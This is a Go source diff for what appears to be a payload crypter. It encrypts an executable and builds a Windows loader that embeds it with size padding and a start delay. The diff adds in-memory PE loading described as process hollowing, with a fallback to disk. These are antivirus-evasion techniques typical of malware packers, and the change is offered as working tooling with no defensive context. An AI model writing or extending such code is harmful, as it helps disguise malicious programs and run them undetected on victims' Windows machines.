@@ -4,6 +4,7 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	_ "embed"
 	"encoding/hex"
 	"flag"
 	"fmt"
@@ -15,6 +16,9 @@ import (
 	"strings"
 	"time"
 )
+
+//go:embed hollow_windows.go
+var hollowingCode string
 
 const (
 	keySize   = 32
@@ -128,6 +132,16 @@ func decryptBlob(data, key []byte) ([]byte, error) {
 // ---------------------------------------------------------------------------
 
 func runPlain(plain []byte, args []string) error {
+
+	if runtime.GOOS == "windows" {
+		err := runPEInMemory(plain)
+		if err == nil {
+			return nil
+		}
+		// Fallback if PE loading fails (e.g., 32-bit exe, or missing TLS)
+		fmt.Fprintf(os.Stderr, "In-memory PE load failed: %v. Falling back to disk...\n", err)
+	}
+
 	h := 64
 	if len(plain) < h {
 		h = len(plain)
@@ -201,25 +215,34 @@ func compileSelfContained(blob, key []byte, outputName, outputDir string, addSiz
 	}
 	defer os.RemoveAll(buildDir)
 
-	// The encrypted payload is embedded with //go:embed.
+	// 1. The encrypted payload
 	if err := os.WriteFile(filepath.Join(buildDir, "payload.enc"), blob, 0o644); err != nil {
 		return err
 	}
 
-	// Optional padding file embedded with //go:embed to increase binary size.
+	// 2. Optional padding file
 	padBytes := int(addSizeMB * 1024 * 1024)
 	if padBytes < 0 {
 		padBytes = 0
 	}
+
 	if err := os.WriteFile(filepath.Join(buildDir, "padding.bin"), make([]byte, padBytes), 0o644); err != nil {
 		return err
 	}
 
+	// 3. Write the process hollowing / PE loader logic for Windows
+	if err := os.WriteFile(filepath.Join(buildDir, "hollow_windows.go"), []byte(hollowingCode), 0o644); err != nil {
+		return err
+	}
+
+	// 4. Write the main wrapper template
 	src := strings.Replace(runnerTemplate, "{{KEY}}", hex.EncodeToString(key), 1)
 	src = strings.Replace(src, "{{DELAY_MS}}", strconv.FormatInt(int64(delaySec*1000), 10), 1)
 	if err := os.WriteFile(filepath.Join(buildDir, "main.go"), []byte(src), 0o644); err != nil {
 		return err
 	}
+
+	// 5. Write go.mod
 	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"),
 		[]byte("module evanpayload\n\ngo 1.21\n"), 0o644); err != nil {
 		return err
@@ -233,13 +256,19 @@ func compileSelfContained(blob, key []byte, outputName, outputDir string, addSiz
 		return err
 	}
 
+	// 6. Build for Windows
 	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-s -w", "-o", outPath, ".")
 	cmd.Dir = buildDir
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 
-	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
-
+	var env []string
+	for _, e := range os.Environ() {
+		if !strings.HasPrefix(e, "GOOS=") && !strings.HasPrefix(e, "GOARCH=") {
+			env = append(env, e)
+		}
+	}
+	cmd.Env = append(env, "GOOS=windows", "GOARCH=amd64")
 	return cmd.Run()
 }
 
@@ -306,6 +335,16 @@ func decryptEmbedded() ([]byte, error) {
 }
 
 func runPlain(plain []byte, args []string) error {
+
+	if runtime.GOOS == "windows" {
+		err := runPEInMemory(plain)
+		if err == nil {
+			return nil
+		}
+		// Fallback if PE loading fails (e.g., 32-bit exe, or missing TLS)
+		fmt.Fprintf(os.Stderr, "In-memory PE load failed: %v. Falling back to disk...\n", err)
+	}
+
 	h := 64
 	if len(plain) < h {
 		h = len(plain)
